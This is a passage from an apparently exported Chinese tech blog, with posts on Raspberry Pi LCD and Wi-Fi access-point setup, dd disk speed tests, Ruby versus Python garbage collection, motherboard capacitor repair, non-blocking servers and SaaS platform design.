将代码加载到树莓派上的最简单的方法就是将树莓派连上网络，然后直接通过git的clone命令来下载。只要在合适的目录下（比如说/home/pi/）键入以下命令即可： 1234apt-get install gitgit clone http://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code.gitcd Adafruit-Raspberry-Pi-Python-Codecd Adafruit_CharLCD 测试现在你就可以测试之前连接好的线路了，只要简单运行Python代码Adafruit_CharLCD.py即可。因为这里的代码很少，它只会简单的显示出一段测试消息。 无论你使用的是什么型号的树莓派，译者在这里建议大家将引脚21替换换为引脚18， 所以这里要对 Adafruit_CharLCD.py做一个小小的改动，将： 1def __init__(self, pin_rs=25, pin_e=24, pins_db=[23, 17, 21, 22], GPIO = None): 修改为： 1def __init__(self, pin_rs=25, pin_e=24, pins_db=[23, 17, 18, 22], GPIO = None): 可以使用nano编辑器来修改代码。 下图为译者按照参考进行的试验，整体进行很顺利，提醒一下译者连接的时候就是用的树莓派的Pin #18口 而不是原文作者使用的#21或者#27。（顺便让译者的小黄人stuart也上一下镜，希望大家喜欢 :D ） IP和时钟的显示这个脚本的功能是显示你的IP地址，若想显示无线接口的IP地址，请将代码中的eth0替换为wlan0或者wlan1即可。 123456789101112131415161718192021222324#!/usr/bin/pythonfrom Adafruit_CharLCD import Adafruit_CharLCDfrom subprocess import *from time import sleep, strftimefrom datetime import datetimelcd = Adafruit_CharLCD()cmd = &quot;ip addr show eth0 | grep inet | awk '{print $2}' | cut -d/ -f1&quot;lcd.begin(16,1)def run_cmd(cmd): p = Popen(cmd, shell=True, stdout=PIPE) output = p.communicate()[0] return outputwhile 1: lcd.clear() ipaddr = run_cmd(cmd) lcd.message(datetime.now().strftime('%b %d %H:%M:%S\\n')) lcd.message('IP %s' % ( ipaddr ) ) sleep(2) 运行代码运行代码很简单，直接输入下列命令即可。注意脚本的权限问题，可用chmod +x命令修改为可执行。 1sudo ./Adafruit_CharLCD_IPclock_example.py 显示结果如下 初始化脚本能成功显示出时间和IP地址固然很好，但是这需要我们手动去启动 Adafruit_CharLCD_IPclock_example.py 若是能在每次树莓派启动时，都能运行这个Python程序的话就会方便很多。下面我们将设置 Adafruit_CharLCD_IPclock_example.py 为开机自启动，而在关机时会自动关闭。 将下段代码粘贴到 /etc/init.d/lcd，注意，需要 root 权限才能在这个目录下执行写操作。 123456789101112131415161718192021222324252627282930### BEGIN INIT INFO# Provides: LCD - date / time / ip address# Required-Start: $remote_fs $syslog# Required-Stop: $remote_fs $syslog# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Liquid Crystal Display# Description: date / time / ip address### END INIT INFO#! /bin/sh# /etc/init.d/lcdexport HOMEcase &quot;$1&quot; in start) echo &quot;Starting LCD&quot; /home/pi/Adafruit-Raspberry-Pi-Python-Code/Adafruit_CharLCD/Adafruit_CharLCD_IPclock_example.py 2&gt;&amp;1 &amp; ;; stop) echo &quot;Stopping LCD&quot; LCD_PID=`ps auxwww | grep Adafruit_CharLCD_IPclock_example.py | head -1 | awk '{print $2}'` kill -9 $LCD_PID ;; *) echo &quot;Usage: /etc/init.d/lcd {start|stop}&quot; exit 1 ;;esacexit 0 你需要相应的将路径修改为你实际保存该脚本的路径才行。 修改初始化脚本的执行权限： 1sudo chmod +x /etc/init.d/lcd 用 update-rc.d 命令使系统感知lcd初始化脚本： 1sudo update-rc.d lcd defaults 现在每次启动树莓派的时候lcd也会自动启动并显示出系统的时间和IP地址到屏幕上。这样你就可以在不用屏幕显示器的情况下知道树莓派的IP地址以及何时可以连接上它。 时区最后但也是最重要的是：我的树莓派是按世界统一时间（UTC）配置的，但是我想让它显示出我所在的本地时间。以下命令可将树莓派设定为任意时区的本地时间，这个命令是一次性的，一旦完成设定，重启之后也不会失效。 1sudo dpkg-reconfigure tzdata 指令输入之后会转到一个选择时间域的程序，下移光标选择你所在的时区就可以了。","link":"/hexo-blog/2015/04/12/%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A9%B1%E5%8A%A8%E4%B8%80%E4%B8%AA-16%C3%972-%E7%9A%84-LCD/"},{"title":"使用 dd 命令测试 USB 和 SSD 硬盘的读写速度","text":"来源：binarytides 原文： http://www.binarytides.com/linux-test-drive-speed/译文： LCTT http://linux.cn/article-3696-1.html 译者：runningwater 磁盘驱动器速度磁盘驱动器的速度是以一个单位时间内读写数据量的多少来衡量的。dd 命令是一个简单的命令行工具，它可用对磁盘进行任意数据块的读取和写入，同时可以度量读取写入的速度。 在这篇文章中，我们将会使用 dd 命令来测试 USB 和 SSD 磁盘的读取和写入速度。 数据传输速度不但取决于驱动盘本身，而且还与连接的接口有关。比如，USB 2.0 端口的最大传输速度是 35 兆字节/秒，所以如果您把一个支持高速传输的 USB 3.0 驱动盘插入 USB 2.0 端口的话，它实际的传输速度将是 2.0 端口的下限。 这对于 SSD 也是一样的。 SSD 连接的 SATA 端口有不同的类型。平均是 375 兆字节/秒的 SATA 2.0 端口理论上最大传输速度是 3 Gbit/秒，而 SATA 3.0 是这个速度的两倍。 测试方法挂载上驱动盘，从终端进入此盘目录下。然后使用 dd 命令，首先写入固定大小块的一个文件，接着读取这个文件。 dd 命令通用语法格式如下： 1dd if=path/to/input_file of=/path/to/output_file bs=block_size count=number_of_blocks 当写入到驱动盘的时候，我们简单的从无穷无用字节的源 /dev/zero 读取，当从驱动盘读取的时候，我们读取的是刚才的文件，并把输出结果发送到无用的 /dev/null。在整个操作过程中， dd 命令会跟踪数据传输的速度并且报告出结果。 固态硬盘我们使用的是一块“三星 Evo 120G” 的固态硬盘。它性价比很高，很适合刚开始用固态硬盘的用户，也是我的第一块固态硬盘，并且也是市场上效果最好的固态硬盘之一。 这次实验中，我们把硬盘接在 SATA 2.0 端口上。 写入速度首先让我们写入固态硬盘 1dd if=/dev/zero of=./largefile bs=1M count=1024 1231024+0 records in1024+0 records out1073741824 bytes (1.1 GB) copied, 4.82364 s, 223 MB/s 1M 的大小实际上是相当大的。你可以尝试用更小的尺寸如 64K 甚至是 4K 的。 读取速度现在读回这个文件。但是，得首先清除内存的缓存，以确保这个文件确实是从驱动盘读取的。 运行下面的命令来清除内存缓存 1sudo sh -c &quot;sync &amp;&amp; echo 3 &gt; /proc/sys/vm/drop_caches&quot; 现在读取此文件 1dd if=./largefile of=/dev/null bs=4k 123165118+0 records in165118+0 records out676323328 bytes (676 MB) copied, 3.0114 s, 225 MB/s 在 Arch Linux 的维基页上有一整页的关于不同的厂商，如英特尔、三星、Sandisk 等提供的各类固态硬盘 读/写速度的信息。点击如下的 url 可以查看相关信息。 https://wiki.archlinux.org/index.php/SSD_Benchmarking USB此次实验我们会测量普通的 USB/随身笔的读写速度。驱动盘都是接入标准的 USB 2.0 端口的。首先用的是一个 4GB 大小的 sony USB 驱动盘，随后用的是一个 16GB 大小的 strontium 驱动盘。 首先把驱动盘插入端口，并挂载上，使其可读。然后从命令行下面进入挂载的文件目录下。 Sony 4GB - 写入这个实验中，用 dd 命令向驱动盘写入一个有 10000 块，每块 8K 字节的文件。 1dd if=/dev/zero of=./largefile bs=8k count=10000 12310000+0 records in10000+0 records out81920000 bytes (82 MB) copied, 11.0626 s, 7.4 MB/s 因此，写入速度约为7.5兆字节/秒。这是一个很低的数字。 Sony 4GB - 读取把相同的文件读取回来，测试速度。首先运行如下命令清除内存缓存。 1sudo sh -c &quot;sync &amp;&amp; echo 3 &gt; /proc/sys/vm/drop_caches&quot; 现在就可以使用 dd 命令来读取文件了。 1dd if=./largefile of=/dev/null bs=8k 1238000+0 records in8000+0 records out65536000 bytes (66 MB) copied, 2.65218 s, 24.7 MB/s 读取速度出来大约是25兆字节/秒，这大致跟廉价 USB 驱动盘的标准相匹配吧。 USB2.0 理论上最大信号传输速率为480兆比特/秒，最小为60兆字节/秒。然而，由于各种限制实际传输速率大约280兆比特/秒和35兆字节/秒之间。除了这个，实际的速度还取决于驱动盘本身的质量好坏以及其他的因素。 上面实验中， USB 驱动盘插入USB 2.0 端口，读取的速度达到了 24.7兆字节/秒，这是很不错的读速度。但写入速度就不敢恭维了。 下面让我们用 16GB 的 Strontium 驱动盘来做相同的实验。虽然 Strontium 的 USB 驱动盘很稳定，但它也是一款很便宜的品牌。 Strontium 16gb 盘写入速度1dd if=/dev/zero of=./largefile bs=64k count=1000 1231000+0 records in1000+0 records out65536000 bytes (66 MB) copied, 8.3834 s, 7.8 MB/s Strontium 16gb 盘读取速度12sudo sh -c &quot;sync &amp;&amp; echo 3 &gt; /proc/sys/vm/drop_caches&quot;dd if=./largefile of=/dev/null bs=8k 1238000+0 records in8000+0 records out65536000 bytes (66 MB) copied, 2.90366 s, 22.6 MB/s 它的读取速度就要比 Sony 的低了。 参考资料 http://en.wikipedia.org/wiki/USB https://wiki.archlinux.org/index.php/SSD_Benchmarking","link":"/hexo-blog/2015/04/13/%E4%BD%BF%E7%94%A8-dd-%E5%91%BD%E4%BB%A4%E6%B5%8B%E8%AF%95-USB-%E5%92%8C-SSD-%E7%A1%AC%E7%9B%98%E7%9A%84%E8%AF%BB%E5%86%99%E9%80%9F%E5%BA%A6/"},{"title":"对比Ruby和Python的垃圾回收（1）","text":"注：这篇文章基于我在布达佩斯的RuPy大会上所作的演讲。我觉得与其直接将幻灯片发布出来，不如在我还有印象的时候将它写成博客来的更有意义。同样，我会在将来发布RuPy大会的视频链接。我计划将在RubyConf大会上发表类似的演讲，除了有关于Python的部分，并且将对比MRI、JRuby和Rubinius的垃圾回收器是怎样工作的。 如果想要对Ruby垃圾回收器以及内部原理有更加深入的了解，你可以在我即将出版的新书《Ruby Under a Microscope》中找到答案。 在”Ruby Python”大会上，我想对比Ruby和Python内部的垃圾回收机制是一件很有意思的事情。在开始之前，我们为什么要讨论垃圾回收机制呢？毕竟这是一个最迷人的，最令人激动的主题，不是吗？你们有多少人对垃圾回收机制感到兴奋？(许多大会参与者竟然举起了双手！) 最近，在Ruby社区中有一篇帖子，关于怎样通过修改Ruby GC的设置来提高单元测试的速度。这棒极了！通过减少GC垃圾回收的处理来提高测试的速度，这是一件好事，但是不怎的，GC不会真正的让我感到兴奋。就如咋一看就感觉令人厌烦，枯燥的技术帖子。 事实上，垃圾回收是一个令人着迷的主题：垃圾回收算法不仅是计算机科学历史一个重要的部分，更是前沿研究的一个主题。例如，MRI Ruby解释器使用的”Mark Sweep”算法已经超过了50年的历史，与此同时，在Rubinius解释器中使用的一种垃圾回收算法，是在Ruby中的另一种实现方式，这种算法仅仅是在2008才被研究出来。 然而，”垃圾回收”的这个名称非常不恰当。 应用程序的心脏垃圾回收系统要做的不仅仅是”回收垃圾”。事实上，它主要完成三个重要任务： 为新的对象分配内存 标记垃圾对象 回收垃圾对象占用的内存 想象你的应用程序是一个人的身体：所有你写的优雅代码，业务逻辑，算法，将会成为你的应用程序的大脑或智能。与此类似的，你认为垃圾回收器会成为身体的哪一个部分呢？(我从大会的听众中得到了很多有趣的答案：肾，白细胞) 我认为垃圾回收器是一个应用的心脏。正如心脏为身体的其他部分提供血液和养料一样，垃圾回收器提供内存和对象供程序使用。如果你的心脏停跳，你将活不了几秒。如果垃圾回收器停止运行或者变慢，就像动脉阻塞一样，你的程序将变的慢下来，最后死掉！ 一个简单的例子通过例子来验证理论是一种很好的方式。这里有一个简单的类，用Python和Ruby写成，我们可以将它们作为一个简单的例子： 于此同时，两种代码如此相似，让我感到非常吃惊：Python和Ruby在表达相同的语义时几乎没有差别。但是，两种语言的内部实现方式是否相同呢？ 空闲对象链表在上面的代码中，当我们调用了Node.new(1)之后，ruby将会做什么？也就是说，Ruby怎样创建一个新的对象？ 令人惊讶的是，Ruby做的事情非常少！事实上，在代码运行之前，Ruby解释器会提前创建成千上万的对象放置到一个链表中，这个链表被称为”空闲对象链表”(free list)。空闲对象链表(free list)在概念上看起来像下面的样子： 每一个白色方块可以想象成一个预创建的，没有使用的Ruby对象。当我们调用Node.new，Ruby简单的使用一个对象，并且将它的引用返回给我们： 在上图中，左边的灰色方块代表一个活跃的Ruby对象，已被使用，而其余的白色方块代码没有使用的对象。(注意：当然，图中是一种简化的实现版本。事实上，Ruby将会使用另外一个对象保存字符串”ABC”，使用第三个对象保存Node的定义，以及其他的对象保存代码处理过的抽象语法数”AST”。) 如果我们再次调用Node.new，Ruby仅仅返回另外一个对象的引用。 这种使用预创建对象链表的简单算法发明于50多年前，它的作者是传说中的计算机科学家，约翰·麦卡锡，正是他实现了最初的Lisp解释器。Lisp不仅是第一个函数式编程语言，并且包含了计算机科学中许多突破性的进展。其中之一便是通过垃圾回收机制自动管理内存。 标准版Ruby，也就是”Matz’s Ruby Interpreter”(MRI)，使用了一种类似于约翰麦卡锡在1960年实现的Lisp的垃圾回收算法。就像Lisp一样，Ruby会预先创建对象并且在你创建对象或值的时候返回对象的引用。 在Python中分配对象内存从上面我们可以看出，Ruby会预先创建对象，并且保存在空闲对象链表(free list)中。那么Python呢？ 当然Python内部也会由于各种原因使用空闲对象链表(它使用链表循环确定对象)，Python为对象和值分配内存的方式常常不同于Ruby。 假设我们创建一个Node对象使用Python： Python不同于Ruby，当你创建对象的时候，Python会立即向操作系统申请分配内存。(Python 事实上实现了自己的内存分配系统，它在操作系统内存堆上提供了另外一层抽象，但是今天没有时间深入探讨。 ) 当我们创建第二个对象时，Python将再次向操作系统申请更多的内存： 看起来相当简单，当我们创建Python对象的时候，将花费时间申请内存。 Ruby开发者生活在一个脏乱的房间回到Ruby，由于我们分配越来越多的对象，Ruby将继续为我们从空闲对象链表(free list)获取预分配对象。因此，空闲对象链表将变得越来越短： 或者更短： 请注意，我将一个新的值赋给了n1，Ruby会遗留下旧的值。”ABC”, “JKL”和”MNO”等结点对象会依然保留在内存中。Ruby不会立即清理旧的对象，尽管程序不再使用！作为一名Ruby开发者就像生活在一个脏乱的房间，衣服随意扔在地板上，厨房的水槽中堆满了脏盘子。作为一个Ruby开发者，你必须在一大堆垃圾对象中工作。 Python开发者生活在一所整洁的房子垃圾回收机制在Python和Ruby中迥然不同，让我们回到前面三个Python中Node对象的例子： 从内部来看，每当我们新建一个对象，Python将在对象对应的C语言结构中保存一个数字，叫做引用计数（reference count）。最初，Python将它的值设为1。 值为1表明每个对象有一个指针或引用指向它。假设我们创建一个新的对象，JKL： 正如前面所说，Python将”JKL”的引用设置为1。同样注意到我们改变n1指向了”JKL”，不再引用”ABC”，同时将”ABC”的引用计数减少为0。 通过这一点，Python垃圾回收器将会立即执行！无论何时，只要一个对象的引用计数变为0，python将立即释放这个对象，并且将它的内存返回给操作系统。 上图中，Python将回收”ABC”对象的内存。记住，Ruby只是将旧的对象遗留在那里，并且不去释放它们占用的内存。 这种垃圾回收算法被称为”引用计数”，由乔治柯林斯发明于1960年。非常巧合的是在同一年约翰麦卡锡大叔发明了”空闲对象链表算法”。正如Mike Bernstein在Ruby Conference大会上所说”1960年是属于垃圾回收器的…”。 作为一个Python开发者，就像生活在一个整洁的房间中。你知道，你的室友有些洁癖，他会把你使用过的任何东西都清洗一遍。你把脏盘子，脏杯子一放到水槽中他就会清洗。 现在看另外一个例子，假设我们让n2和n1指向同样的结点： 上图左边可以看到，Python减少了”DEF”的引用计数并且立即回收了”DEF”对象。同时可以看到，由于n1和n2同时指了”JKL”对象，所以它的引用计数变为了2。 标记回收算法最终脏乱的房间将堆满垃圾，生活不能总是如此。Ruby程序在运行一段时间之后，空闲对象链表最终将被用尽。 上图中所有的预分配对象都被用尽(方块全部变成了灰色)，链表上没有对象可用(没有剩余的白色方块)。 此时，Ruby使用了一种由约翰麦卡锡发明的被称为”标记回收”的算法。首先，Ruby将停止程序的执行，Ruby使用了”停止这个世界，然后回收垃圾”的方式。然后，Ruby会扫描所有的指向对象和值的指针或引用。同样，Ruby也会迭代虚拟机内部使用的指针。它会标记每一个指针所能到达的对象。在下图中，我使用了”M”指出了这些标记： 上面三个”M”标记的对象为活跃对象，依然被我们的程序使用。在Ruby解释器内部，通常使用”free bitmap”的数据结构来保存一个对象是否被标记： Ruby将”free bitmap”保存在一个独立的内存区域，以便可以更好的利用Unix的”copy-on-write”特性。更详细的信息，请参考我的另一篇文章《为什么Ruby2.0的垃圾回收器让我们如此兴奋》。 如果活跃对象被标记了，那么其余的便是垃圾对象，意味着它们不再会被代码使用。在下图中，我使用白色的方块表示垃圾对象： 接下来，Ruby将清理没有使用的，垃圾对象，将它们链入空闲对象链表(free list)： 在解释器内部，这个过程非常迅速，Ruby并不会真正的将对象从一个地方拷贝到另一个地方。相反的，Ruby会将垃圾对象组成一个新的链表，并且链入空闲对象链表(free list)。 现在，当我们要创建一个新的Ruby对象的时候，Ruby将为我们返回收集的垃圾对象。在Ruby中，对象是可以重生的，享受着多次的生命！ 标记回收算法 vs. 引用计数算法乍一看，Python的垃圾回收算法对于Ruby来说是相当让人感到惊讶的：既然可以生活在一个整洁干净的房间，为什么要生活在一个脏乱的房间呢？为什么Ruby周期性的强制停止运行程序，去清理垃圾，而不使用Python的算法呢？ 然而，引用计数实现起来不会像它看起来那样简单。这里有一些许多语言不愿像Python一样使用引用计数算法的原因： 首先，实现起来很困难。Python必须为每一个对象留有一定的空间来保存引用计数。这会导致一些细微的内存开销。但更遭的是，一个简单的操作例如改变一个变量或引用将导致复杂的操作，由于Python需要增加一个对象的计数，减少另一个对象的计数，有可能释放一个对象。其次，它会减慢速度。尽管Python在程序运行过程中垃圾回收的过程非常顺畅(当你把脏盘子放到水槽后，它立马清洗干净)，但是运行的并不十分迅速。Python总是在更新引用计数。并且当你停止使用一个巨大的数据结构时，例如一个包含了大量元素的序列，Python必须一次释放许多对象。减少引用计数可能是一个复杂的，递归的过程。最后，它并不总是工作的很好。在我演讲的下一部分，也就是下一篇帖子中能看到，引用计数不能处理循环引用数据结构，它包含循环引用。 下一次…下周我将发布演讲的其他部分。我将讨论Python怎样处理循环引用数据结构，以及在即将到来的Ruby2.1中，垃圾回收器是怎样工作的。传送门 原文：Pat Shaughnessy Visualizing Garbage Collection in Ruby and Python译文：http://python.jobbole.com/60900/","link":"/hexo-blog/2015/04/20/%E5%AF%B9%E6%AF%94Ruby%E5%92%8CPython%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%EF%BC%881%EF%BC%89/"},{"title":"主板维修——更换爆浆电容","text":"家里的电脑买了七、八年了，最近显示器突然出现了偶尔无法正常工作，桌面黑屏，画面无法刷新的情况。 首先怀疑是显卡问题，但是该主板没有独立显卡，是集成显卡，所以问题也就转移到了主板了。 仔细观察了一下主板上的电容，发现果然有一个爆浆了，如图。记下规格：6.3V 1500μF。 下面是具体维修步骤： 1. 从机箱上卸下主板，卸下风扇，将灰尘清理干净 2. 焊下爆浆的电容 用烙铁拆卸电容是一定要注意，因为主板制造工艺与一般家电不同，大部分烙铁无法轻松地将其焊下来，所以最好使用加焊法，即同时给两个焊点加焊至熔化，然后轻轻取下。 然后从旧主板上拆下两个同型号的电容，当然也可以从电子城买到。 左边是爆浆的电容，右边是好电容 3. 焊上好的电容 焊接前最好用大头针将主板孔清理干净，然后将电容轻轻插入，注意正负极。加松香、焊锡焊接。 焊好后用酒精擦除掉残留的松香。 4. 最终效果图 5. 成功点亮，问题解决","link":"/hexo-blog/2015/04/21/%E4%B8%BB%E6%9D%BF%E7%BB%B4%E4%BF%AE%E2%80%94%E2%80%94%E6%9B%B4%E6%8D%A2%E7%88%86%E6%B5%86%E7%94%B5%E5%AE%B9/"},{"title":"树莓派配置 AP，变身无线路由器","text":"首先介绍一下系统环境，笔者用的是树莓派2B (Raspberry Pi 2 Model B)系统是 Arch Linux。另外购得了一个无线网卡，Tenda W311M，RT5370 芯片，支持 Soft-AP。无线网卡是否支持 AP，这点大家购买前一定要确认一下。 大家知道，配置无线 AP 有很多种方法，本文使用 hostapd + dnsmasq 进行配置，如果你不太习惯这两个工具，也可以使用其他方案。 确认无线网卡支持 AP 模式 执行 lsusb 查看接入的 USB 信息。 1234Bus 001 Device 004: ID 148f:5370 Ralink Technology, Corp. RT5370 Wireless AdapterBus 001 Device 003: ID 0424:ec00 Standard Microsystems Corp. SMSC9512/9514 Fast Ethernet AdapterBus 001 Device 002: ID 0424:9514 Standard Microsystems Corp. SMC9514 HubBus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub 可以看到第一行便是笔者的无线网卡。 执行 iw list 查看无线网卡支持的模式。（如果没有请使用 pacman 安装） 请注意 supported interface modes 这一项： 123456software interface modes (can always be added): * IBSS * managed * AP * AP/VLAN * monitor 如果包含 AP 则说明是网卡是支持的，可以继续下一步，否则说明网卡硬件不支持或者驱动不支持。 如果硬件不支持那就没有办法，如果只是驱动不支持可以 Google 相关的驱动，再此就不赘述了。1 2 配置无线热点 安装 hostapd 修改（新建） hostapd.conf vim /etc/hostapd/hostapd.conf，检查以下配置项： 12345678910111213141516171819202122# 无线网卡名称，这里应该与无线网卡对应interface=wlan0driver=nl80211# WIFI 名称ssid=YourWiFiName# 模式：a/b/ghw_mode=g# 信道channel=6macaddr_acl=0auth_algs=1ignore_broadcast_ssid=0wpa=2# WIFI 密码wpa_passphrase=Somepassphrasewpa_key_mgmt=WPA-PSKwpa_pairwise=TKIPrsn_pairwise=CCMP# 最大支持的 station 数量max_num_sta=5logger_stdout=-1logger_stdout_level=2 启动 1systemctl start hostapd 配置 DNS 和 DHCP 服务器 为无线网卡配置 IP 地址 1ifconfig wlan 192.168.0.1/24 也可以使用 12ip link set up dev wlan0ip addr add 192.168.0.1/24 dev wlan0 修改 dnsmasq.conf vim /etc/dnsmasq.conf，检查以下几项： 123456789101112# dnsmasq 的 dns 配置resolv-file=/etc/resolv.dnsmasq.conf# 无线网卡设备名interface=wlan0# ipconfig 配置的无线网卡地址listen-address=192.168.0.1bind-interfacesdhcp-range=192.168.0.100,192.168.0.150,12h# Google DNSserver=8.8.8.8server=8.8.4.4 修改（新建） resolv.dnsmasq.conf 3 vim /etc/resolv.dnsmasq.conf，增加： 1nameserver 127.0.0.1 启动 1systemctl start dnsmasq 启用包转发和 NAT 检查当前转发设置 1sysctl -a | grep forward 临时启用包转发 1sysctl net.ipv4.ip_forward=1 编辑 /etc/sysctl.d/30-ipforward.conf 使每次启动时生效 123net.ipv4.ip_forward=1net.ipv6.conf.default.forwarding=1net.ipv6.conf.all.forwarding=1 启用 NAT 123iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADEiptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPTiptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT 导出 NAT 规则至文件 1iptables-save &gt; /etc/iptables/ap.rules 其他 如果网速不稳定，请确认是否安装了 haveged 上面配置完成后，每次重启后运行以下脚本即可 12345ifconfig wlan0 192.168.0.1/24systemctl start dnsmasqiptables-restore &lt; /etc/iptables/ap.rulessysctl net.ipv4.ip_forward=1systemctl start hostapd","link":"/hexo-blog/2015/04/26/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%85%8D%E7%BD%AE%20AP%EF%BC%8C%E5%8F%98%E8%BA%AB%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8/"},{"title":"非阻塞服务器需要注意的主要问题","text":"原文：http://amix.dk/blog/post/19581#The-main-issue-with-non-blocking-servers译文：http://blog.csdn.net/chong232/article/details/6153161 非阻塞服务器有一个严重的问题，一些人甚至在没解决这个问题的背景下就开发自己的应用框架（比如 Python 的 Tornado） 当你使用非阻塞服务器的时候，你会获得出色的性能并且不需要担心可扩展性，然而同时你需要意识到一个问题：你的IO调用、网络系统调用也都是非阻塞的吗？很多人忽略了，他们使用的非阻塞服务器，其实是构建在阻塞库之上的。 在这篇文章里，我将深入对比多线程的服务器与非阻塞的服务器分别是如何工作的，以及你之所以需要在”使用的服务器”与”使用的库”在阻塞模式上保持一致的原因。 Non-blocking servers perform better首先，我不会否认非阻塞服务器比阻塞服务器有更好的性能，尤其在那些有着数以万计的高并发用户的应用场景中。下面通过一些图片对说明这个问题，这些图片是WebFaction所测试的结果： A little holiday present: 10,000 reqs/sec with Nginx! 当他们从 Apache 向 Nginx 迁移时，发现： Nginx每秒可以处理更多的请求： Nginx比Apache使用更少的内存： 真是令人吃惊的结果，那么为何不把非阻塞技术引入到你的 Python/Java/Ruby/PHP 框架里呢？ How blocking servers work阻塞式服务器通常是基于多线程的，一个线程处理一个请求，它的工作方式可以现象化地表示为： 关于阻塞式服务器，有如下事实： 处理高并发连接请求代价昂贵，服务器需要量产线程——线程并不便宜。 库函数需要线程安全，这是多线程环境必需的。 How non-blocking servers work非阻塞服务器不需要多线程，它通过一个IO循环及(异步)事件来处理请求，它的工作方式如下： 关于非阻塞式服务器，有如下事实： 处理高并发连接请求不是困难，这也是它被用于comet技术的重要原因 在IO循环中的所有操作都必须是非阻塞，否则会因为你一个操作而阻断了整个循环 不需要线程安全 Where Tornado (and others) go wrong我以Tornado为例，但是其它的非阻塞式应用存在相同的问题。 Tornado使用了非阻塞式的服务器，但他们同时使用的库是阻塞式的，于是： Tornado关于Mysql连接的库是阻塞的，这意味如果你的查询需要1s，那么你的loop循环就需要停下来1s等待查询的完成 不要使用昂贵的系统调用，它会卡住整个循环 同样，不要在循环中渲染模板，原因同上 就像我之前提过的，阻塞整个loop是致命的，因为此时你什么也做不了！ Conclusion总之，非阻塞技术精巧且性能卓越，但要正确运用此技术，你必须使用同样是阻塞式的IO和Network调用，否则你将后患无穷！还有，请注意Python, Ruby, Java or PHP等这些语言缺省都是阻塞式的，所以当你同时使用非阻塞的服务器和这些语言其中之一的话，请务必当心！","link":"/hexo-blog/2015/04/29/%E9%9D%9E%E9%98%BB%E5%A1%9E%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%B8%BB%E8%A6%81%E9%97%AE%E9%A2%98/"},{"title":"云平台之 SaaS 随想","text":"原文地址：http://88250.b3log.org/saas-essay SaaS 平台以应用为中心“平台”本来就比较泛，再加上“SaaS”的话就更飘渺了。 我们先从一个简单的场景来看： 开发者开发应用后在市场上线 用户购买应用使用 开发者通过市场反馈调整运维，为后续版本计划提供依据 新版本上线，用户升级使用 这是以应用为中心的一个闭环（市场-开发-运维-市场），实现了应用的整个生命周期，我们可以把平台看成是这个场景的支撑，场景中的所有活动都是在平台上完成的，整个场景就是一个 SaaS 生态系统。 组成元素在这个 SaaS 生态系统中，我们可以简单总结出以下几个必须的组成元素： 开发者：个人/组织，要做的事情是开发应用、运维应用 运行环境：应用程序实际运行的环境，要解决的是如何接入/部署应用 运维控制：应用运行情况监控，要解决的是动态监控 用户：使用应用的个人/组织，要做的事情是（购买）使用应用 社区：开发者社区、用户社区，供开发者/用户进行分享、反馈 应用市场：应用上架展示，供开发者应用上线，用户（购买）使用 按参与者角色（开发者、平台、用户）把这几个组成元素分类后，SaaS 平台部分包括了：运行环境、运维控制、社区、应用市场。这里的“平台”是个广义概念，是多个具体平台的综合。例如“Android 平台”，包括了开发平台、应用市场、硬件平台、开发者社区等。 面向应用用户如果把 SaaS 应用比作是一个游戏，那么， SaaS 平台制订了基本的游戏规则，并提供了游戏道具 开发者制订了游戏的细节规则，形成游戏玩法 用户选择游戏，玩游戏 最终，用户的体验是该游戏是否好玩，这是由平台和开发者共同决定的。也就是说，SaaS 平台和开发者是利益共同体，并且平台的基本规则决定了游戏的质量的起点。 PaaS 与 SaaS 从用户角度看：PaaS 面向的是开发者用户，SaaS 面向的是应用用户 从应用角度看：PaaS 侧重应用的 Runtime，SaaS 侧重应用的接入与集成 PaaS 不关注应用业务领域，SaaS 则是某业务领域 PaaS 成功与否看的是开发者的反馈，SaaS 成功与否是应用用户的反馈 另外，SaaS 不是必然包含 PaaS。开发者在选定了 SaaS 后应该也可以选择 PaaS。但这个方式需要开发者熟悉多种平台，提高了运维的难度。 应用引擎应用引擎（App Engine）是目前业界实现 PaaS 的主流方式。它至少需要为开发者提供以下几个功能： 部署：上传部署包部署 实例管理：启停实例 日志：查看日志，分实例 内部至少需要实现以下几个功能： 请求路由：请求分发到应用进程实例 状态采集：基础设施、实例状态采集 应用隔离：应用之间不能相互影响 实例管理：按需启停 资源控制：应用对资源的使用是受控的 耗用统计：API 调用次数、IO/存储大小 配额模型：量化应用对资源的使用 目前我们熟悉的几个 XAE 都是这样做的，并且从传统的沙箱模型（API 受控）迁移到基于 LXC 的容器（Docker）已经是趋势，因为这样对应用开发的限制更小，开发者更容易接受。 服务目前业界主流的 PaaS 中都提供了基础服务，这些服务都是属于技术服务： 缓存 消息队列 消息推送 文件存储 定时任务 … 这一块相对比较固定，调用方式一般都是基于 SDK API，有的也有 RESTful 接口。 部署包以 Java 为例，部署包一般都是 war 包，但除了满足标准 war 结构外，还需要加入一些平台特定的配置规则。比如通过配置文件描述 appid（或是通过 war 包名），用于部署时对应到平台上的应用配置。也就是说所有的应用配置都是可以做成非包内配置文件的，好比应用上某些地方需要抉择使用数据库或配置文件，这是平台设计时需要仔细考虑的。 应用集成应用集成主要是针对 SaaS 而言，用户选择多个应用后可以在一个视图中使用它们，这些应用之间也可能存在调用交互。 视图最简单的视图集成方式就是通过导航（图标），用户安装了某应用后，该应用图标就出现在这个用户的“首页”视图中。由平台给出集成规则，应用开发时遵循这些规则就可以集成进来。 对于平台来说，这一块很有难度，或者说很难把握： 如果集成规则太复杂，那会对开发者造成很多困扰和不便，但对用户来说就更透明、无缝，用户体验会更好 如果集成规则太简单，那对开发者约束较低，但集成度也更低，用户体验可能很难提升 目前业界的大多数 SaaS 在做这一块时都选择了简单的集成方式：接入图标，用户使用时点击图标并跳转到对应的应用。深度的集成（样式、交互模式统一）的方式很少见（互联网 SaaS 基本不可行，除非已经是业界标准）。 RPC服务端的调用也存在集成，应用之间互调也是 SaaS 需要考虑的场景。这部分可选的做法是 SaaS 提供 